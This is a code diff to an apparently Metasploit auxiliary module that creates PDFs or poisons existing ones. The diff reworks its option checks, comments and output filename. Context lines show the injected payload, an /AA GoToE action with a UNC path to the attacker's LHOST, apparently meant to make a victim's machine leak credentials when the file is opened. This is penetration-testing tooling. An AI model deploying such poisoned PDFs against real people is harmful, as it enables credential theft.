@@ -40,14 +40,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    if !datastore['PDFINJECT'].nil? && datastore['PDFINJECT'].to_s.end_with?('.pdf')
-        injectpdf
+    if datastore['PDFINJECT'].to_s.end_with?('.pdf') && datastore['FILENAME'].to_s.end_with?('.pdf')
+      print_error "Please configure either FILENAME or PDFINJECT"
+    elsif !datastore['PDFINJECT'].nil? && datastore['PDFINJECT'].to_s.end_with?('.pdf')
+      injectpdf
+    elsif !datastore['FILENAME'].nil? && datastore['FILENAME'].to_s.end_with?('.pdf')
+      createpdf
     else
-        if !datastore['FILENAME'].nil? && datastore['FILENAME'].to_s.end_with?('.pdf')
-          createpdf
-        else
-          print_error "FILENAME is empty, please enter FILENAME and rerun module"
-        end
+      print_error "FILENAME or PDFINJECT must end with '.pdf' file extension"
     end
   end
 
@@ -55,6 +55,7 @@ class MetasploitModule < Msf::Auxiliary
     #Payload which gets injected
     inject_payload = "/AA <</O <</F (\\\\\\\\#{datastore['LHOST']}\\\\test)/D [ 0 /Fit]/S /GoToE>>>>"
 
+    #if given path doesn't exist display error and return
     unless File.exists?(datastore['PDFINJECT'])
       #If file not found display error message
       print_error "File doesn't exist #{datastore['PDFINJECT']}"
@@ -79,22 +80,22 @@ class MetasploitModule < Msf::Auxiliary
       newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
     end
 
+    #Display error message if we couldn't poison the file
     if newdata.nil?
       print_error "Could not find placeholder to poison file this time...."
       return
     end
 
-    newfilename = datastore['PDFINJECT'][(0..(datastore['PDFINJECT'].length-5))]+"_malicious.pdf"
+    #Create new filename by replacing .pdf with _malicious.pdf
+    newfilename = "#{datastore['PDFINJECT'].gsub(/\.pdf$/, '')}_malicious.pdf"
     #Write content to file
     File.open(newfilename, 'wb') { |file| file.write(newdata) }
     #Check file exists and display path or error message
     if File.exists?(newfilename)
-      print_good("Malicious file writen to "+newfilename)
+      print_good("Malicious file writen to: #{newfilename}")
     else
       print_error "Something went wrong creating malicious PDF file"
     end
-
-
   end
 
   def createpdf
